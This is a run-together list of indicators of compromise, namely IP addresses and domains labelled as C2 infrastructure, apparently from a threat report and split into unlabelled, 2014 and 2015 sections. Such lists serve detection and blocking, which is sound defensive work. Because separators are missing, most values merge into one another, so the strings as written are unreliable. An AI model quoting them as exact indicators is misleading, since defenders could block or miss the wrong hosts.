Addresses:\n218.106.246.189\n210.209.116.105210.209.117.235123.254.111.169113.10.168.22126.25.201.73126.125.35.247218.106.246.222112.218.71.202\nDomains:\nen.amazonwikis.com mail.projectscorp.netnews.sfcorporation.compic.elecarrow.comqsgs.sfcorporation.comrbjg.moviestops.com rbny.sfcorporation.comsmtp.adobekr.comssl.gmnspace.comssl.projectscorp.netupdate.adobekr.comyahoo.gmnspace.com yahoomail.adobeus.com\n2014 C2 Infrastructure:\nIP Addresses:\n23.238.229.128\n27.255.72.6827.255.72.6927.255.72.78211.42.249.37210.209.116.105210.209.117.235218.106.246.222108.171.240.154112.218.71.202112.175.69.60112.175.69.89114.108.150.38\nDomains:\nb3fk.sfcorporation.combdt.wordoscorp.com bfym2.amazonwikis.comblog.sfcorporation.combooks.sfcorporation.combygs.sfcorporation.comcbgs.sfcorporation.comcdic.sfcorporation.comd2ch.sfcorporation.comdgfk.sfcorporation.comgde.moviestops.comguhk.moviestops.comhglg.wordoscorp.com hjxt.sfcorporation.comhome.sfcorporation.comhsy.moviestops.comimage.amazonwikis.comjggs.sfcorporation.comjrfw.amazonwikis.comjrgs.sfcorporation.comkb1gs.sfcorporation.commail.projectscorp.netmovie.sfcorporation.commusic.sfcorporation.comnews.elecarrow.comnews.sfcorporation.compic.elecarrow.compic.glkjcorp.compics.adobeus.compics.amazonwikis.comqsgs.sfcorporation.comrbjg.moviestops.comrbny.sfcorporation.comruag.amazonwikis.comsgad.sfcorporation.comsmgs.amazonwikis.comsport.sfcorporation.comssl.projectscorp.netssl.sfcorporation.comtdfg.moviestops.comtqsj.sfcorporation.comtzcl.sfcorporation.comuworks.sfcorporation.comvideo.sfcorporation.comvod.sfcorporation.comwbjs.sfcorporation.comweb.sfcorporation.comwed.amazonwikis.comwsxg.moviestops.comwxpb.sfcorporation.comxjgs.sfcorporation.comxkgs.sfcorporation.comyahoo.gmnspace.comygfk.sfcorporation.comyhkj.sfcorporation.com\n2015 C2 Infrastructure:\nIP Addresses:\n113.10.139.218\n126.125.35.24727.255.72.68218.106.246.222210.209.116.105210.209.117.235118.193.163.143114.108.150.38210.209.117.148118.99.37.87\nDomains:\nekzy.gmnspace.comhsjs.wordoscorp.comjnhs.tomshardpc.commail.projectscorp.netnews.elecarrow.compic.glkjcorp.comrbjg.moviestops.comrjby.tomshardpc.comrjjh.wordoscorp.comssl.exemail.netssl.gmnspace.comssl.projectscorp.nettzz.exemail.netup.adobekr.comv.exemail.netwih365.comyqby.wordoscorp.comzpgx.tomshardpc.com"
}